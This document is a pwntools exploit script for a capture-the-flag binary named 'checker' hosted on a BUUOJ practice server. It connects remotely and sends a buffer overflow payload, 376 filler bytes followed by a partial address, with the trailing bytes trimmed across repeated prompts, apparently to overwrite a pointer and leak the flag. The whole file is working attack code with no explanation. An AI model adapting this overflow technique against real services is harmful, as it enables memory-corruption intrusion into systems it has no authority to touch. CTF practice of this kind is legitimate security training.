'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
'''

from pwn import *


local = 0
url, port = "node5.buuoj.cn", 29685
filename = "./checker"
elf = ELF(filename)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context(arch="amd64", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    # context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)

def B():
    gdb.attach(io)
    pause()

def pwn():
    io.sendlineafter(b'Hello! What is your name?\nNAME : ', b'hacking')
    payload = b'\xff' * 376 + b'\xc0\x10\x60'
    io.sendlineafter(b'Do you know flag?\n>> ', payload + b'\x11\x11\x11')
    io.sendlineafter(b'Do you know flag?\n>> ', payload + b'\x11\x11')
    io.sendlineafter(b'Do you know flag?\n>> ', payload + b'\x11')
    io.sendlineafter(b'Do you know flag?\n>> ', payload)
    io.sendlineafter(b'Do you know flag?\n>> ', b'yes')
    io.sendlineafter(b'\nOh, Really??\nPlease tell me the flag!\nFLAG : ', b'hacking')


if __name__ == "__main__":
    pwn()
    io.interactive()
